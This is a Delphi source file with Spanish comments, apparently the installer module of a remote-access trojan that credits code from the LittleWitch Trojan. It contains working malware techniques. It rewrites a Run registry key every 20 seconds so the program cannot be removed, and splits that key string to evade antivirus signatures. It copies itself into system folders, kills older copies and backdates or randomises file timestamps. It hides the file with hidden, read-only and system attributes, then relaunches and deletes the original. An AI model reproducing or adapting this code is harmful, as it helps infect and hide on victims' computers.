unit UnitInstalacion;

interface

uses
  Windows,
  TLHelp32,
  ShellApi,
  vars,
  PsAPI,
  minireg,
  SettingsDef;

procedure Instalar();
function RutaProcesos(PID: DWORD): string;
function BorrarArchivo(s: string): boolean;
function stringreplace(s1:string;s2:string;s3:string):string;
function CreateDir(const Dir: string): Boolean;
function fileexists(const filename: string): boolean;
function lc(const S: string): string;//lower case
function inttostr(const value: integer): string;
Function StrtoInt(Const S: String): Integer;
function FindWindowsDir: string;
function FindSystemDir: string;
function FindTempDir: string;
function FindRootDir: string;
implementation



var
  ThreadAutoInicioID: cardinal;

  
function inttostr(const value: integer): string;
var
  S:      string[11];
begin
  Str(Value, S);
  Result := S;
end;


Function StrtoInt(Const S: String): Integer;
Var
  E: Integer;
Begin
  Val(S, Result, E);
End;

procedure AutoInicio;
var
  Clave: string;
begin
  while True do
  begin
    //Ahora me agrego al autoinico
    //Metodo policies
    if Configuracion.bArranqueRun then
    begin
      //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
      //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
      //Y si no, es por pura diversión :)

      Clave := 'SOFTWARE\Mic';
      Clave := Clave + 'rosoft\Wind';
      Clave := Clave + 'ows\CurrentVe';
      Clave := Clave + 'rsion\Run\';
      Clave := Clave + Configuracion.sRunRegKeyName;
       RegSetString(HKEY_CURRENT_USER, clave, ParamStr(0));
    end;
    Sleep(20000); //20 sec
  end;
end;

procedure CrearThreadAutoInicio;
//Crea un nuevo Thread en el que el server se agrega al auto inicio cada 20 segundos, para que no lo puedan borrar :)
begin
  BeginThread(nil, 0, @AutoInicio, nil, 0, ThreadAutoInicioID);
end;

function TerminarThreadAutoInicio: boolean;
  //Cierra el thread
begin
  Result := False;
  if ThreadAutoInicioID > 0 then
  begin
    EndThread(ThreadAutoInicioID);
    Result := True;
  end;
end;

procedure Instalar();
var
  i:    cardinal;
  hProcess: THandle;
  Process32: TProcessEntry32;
  SHandle: THandle;
  Pid:  string;
  Next: BOOL;

  FoundFile: TWin32FindData;
  //  H : THandle;
  FileTime:  TFileTime;

begin
  CrearThreadAutoInicio;
  if Configuracion.bCopiarArchivo then //Si me tengo que copiar entonces...
  begin
    //Reemplaza las rutas adecuadas
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%WinDir%\', FindWindowsDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%SysDir%\', FindSystemDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%TempDir%\', FindTempDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%RootDir%\', FindRootDir());
    //Si la carpeta no existe la intento crear

      try
        for i := 0 to 5 do
        begin
          CreateDir(Configuracion.sCopyTo);
          Sleep(10);
        end;
      except
      end;
  {  if not DirectoryExists(Configuracion.sCopyTo) then
      Configuracion.sCopyTo := 'C:\';   }
    //Osea que no la pude crear y sigue sin existir. En ese caso me instalo en el C:


    if lc(ParamStr(0)) <> lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
      //Si no me he copiado
      //tengo que copiarme y ejecutar la copia
    begin
      if FileExists(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
        //Osea que ya existe el archivo del server pero no soy yo! debe ser una version vieja instalada, borrarla y actualizar
      begin
        try//saca de memoria el servidor viejo, y borra el archivo
          Process32.dwSize := SizeOf(TProcessEntry32);
          SHandle := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
          if Process32First(SHandle, Process32) then
            repeat
              Next := Process32Next(SHandle, Process32);
              if Next then
                //si tienen el mismo nombre
                if lc(Process32.szExeFile) =
                  lc(Configuracion.sFileNameToCopy) then
                begin
                  Pid := IntToStr(Process32.th32ProcessID);
                  if Pid <> '' then
                  begin
                    //si la ruta del proceso encontrado es la ruta del server
                    if RutaProcesos(StrToInt(Pid)) =
                      (Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
                    begin
                      //Lo asesino para poderlo borrar después
                      try
                        hProcess := OpenProcess(PROCESS_ALL_ACCESS, True, StrToInt(Pid));
                        TerminateProcess(hProcess, 0);
                      except
                      end;
                    end;
                  end;
                end;
            until not Next;
          CloseHandle(SHandle);
        except
        end;
        //Lo intento borrar repetidamente por si no puedo a la primera :)
        try
          for i := 1 to 10 do
          begin
            BorrarArchivo(PChar(Configuracion.sCopyTo + Configuracion.sFileNameToCopy));
            Sleep(5);
          end;
        except
        end;
      end;
      //Ahora ya me pueedo instalar tranquilamente

      //lo copio en Configuracion.sCopyTo
      CopyFile(PChar(ParamStr(0)), PChar(Configuracion.sCopyTo +
        Configuracion.sFileNameToCopy), True);

      //Si tengo que modificar la fecha...
      if Configuracion.bCopiarConFechaAnterior then
      begin
        SHandle := FindFirstFile(PChar(Configuracion.sCopyTo + '*.*'), FoundFile);
        if SHandle <> INVALID_HANDLE_VALUE then
        begin
          while (string(FoundFile.cFileName) = Configuracion.sFileNameToCopy) or
            (string(FoundFile.cFileName) = '.') or (string(FoundFile.cFileName) = '..') do
            FindNextFile(SHandle, FoundFile);
          if SHandle <> INVALID_HANDLE_VALUE then
            FileTime := FoundFile.ftLastWriteTime;
        end
        else
        begin
          //No hay ningún archivo en la carpeta u ocurrió algun error, entonces escoga una fecha al azar
          FileTime.dwLowDateTime  := Random(4294967295);
          FileTime.dwHighDateTime := Random(4294967295);
        end;
        Windows.FindClose(SHandle);
        SHandle := CreateFile(PChar(Configuracion.sCopyTo +
          Configuracion.sFileNameToCopy), Generic_write, file_share_read or
          file_share_write, nil, open_existing, file_attribute_normal, 0);
        if SHandle <> INVALID_HANDLE_VALUE then
          SetFileTime(sHandle, @FileTime, @FileTime, @FileTime);
        CloseHandle(sHandle);
      end;

      //y lo pongo oculto, readonly y de sistema.
      i := GetFileAttributes(PChar(Configuracion.sCopyTo +
        Configuracion.sFileNameToCopy));
      i := i or $00000002;//faHidden;   //oculto
      i := i or $00000001;//faReadOnly; // solo lectura
      i := i or $00000004;//faSysFile;  //de sistema
      SetFileAttributes(PChar(Configuracion.sCopyTo + Configuracion.sFileNameToCopy), i);

      //Aqui ya estoy copiado, ejecuto el archivo copiado
      if Configuracion.bMelt = True then
        ShellExecute(GetDesktopWindow(), 'open',
          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'),
          PChar('\melt ' + '"' + ParamStr(0) + '"'), nil, 0)
      else
        //Ejecutar sin pasarle el parametro melt
        ShellExecute(GetDesktopWindow(), 'open',
          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'), '', nil, 0);

      //Y me suicido:
      Halt;
    end;
  end;
  //Ahora me agrego al autoinicio

end;

function stringreplace(s1:string;s2:string;s3:string):string;   { (copyto) windir DIR}
begin
s1 := lc(s1);
s2 := lc(s2);
s3 := lc(s3);

if(Pos(s2, 'a'+s1) - 1)>0 then
begin
result := s3+Copy(s1, length(s2)+1, length(s1)-length(s2));

end
else
result := s1;

end;


function BorrarArchivo(s: string): boolean;
  //Esta función la escribió aXLiTo
  //http://www.littlewitchtrojan.cjb.net/
  //y fue sacada de el código fuente de LittleWitch Trojan
var
  i: byte;
begin
  Result := False;
  if FileExists(s) then
    try
      //saco atributos para poder borrar un archivo sin importar que sea oculto, solo lectura o de sistema
      i := GetFileAttributes(PChar(s));
      i := i and $00000002;//faHidden;
      i := i and $00000001;//faReadOnly;
      i := i and $00000004;//faSysFile;
      SetFileAttributes(PChar(s), i);
      Result := DeleteFile(PChar(s));
    except
    end;
end;

function CreateDir(const Dir: string): Boolean;
begin
  Result := CreateDirectory(PChar(Dir), nil);
end;

function RutaProcesos(PID: DWORD): string;
var
  Handle: THandle;
begin
  Result := 'Desconocido';
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PID);
  if Handle <> 0 then   //Si el proceso existe
    try
      SetLength(Result, MAX_PATH);
      begin
        if GetModuleFileNameEx(Handle, 0, PChar(Result), MAX_PATH) > 0 then
          //Obtenemos path del proceso
          SetLength(Result, length(PChar(Result)))
        else
          Result := 'Desconocido';
      end
    finally
      CloseHandle(Handle);
    end;
end;


function fileexists(const filename: string): boolean;
var
  FileData      :TWin32FindData;
  hFile         :Cardinal;
Begin
  hFile := FindFirstFile(pChar(FileName), FileData);
  If (hFile <> INVALID_HANDLE_VALUE) Then
  Begin
    Result := True;
    Windows.FindClose(hFile);
  End Else
    Result := False;
End;

function lc(const S: string): string;
const a=1;
var
Max, CharNo : Cardinal;
pResult : PChar;
begin
Max := Length(S);
SetLength(Result, Max);
if Max <= 0 then exit;
pResult := PChar(Result);
CharNo := 0;
repeat
pResult[CharNo] := S[CharNo+a];
if (S[CharNo+a]>= 'A') and (S[CharNo+a] <= 'Z') then
pResult[CharNo] := char(Ord(S[CharNo+a]) + 32);
Inc(CharNo);
until(CharNo>= Max);
end;


function FindWindowsDir: string;
  //retorna el directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindSystemDir: string;
  //retorna el directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindTempDir: string;
  //retorna el directorio de los temporales
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindRootDir: string;
  //retorna el root del directorio de windows
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
    Result := Copy(Result, 1, 3);
end;

end.
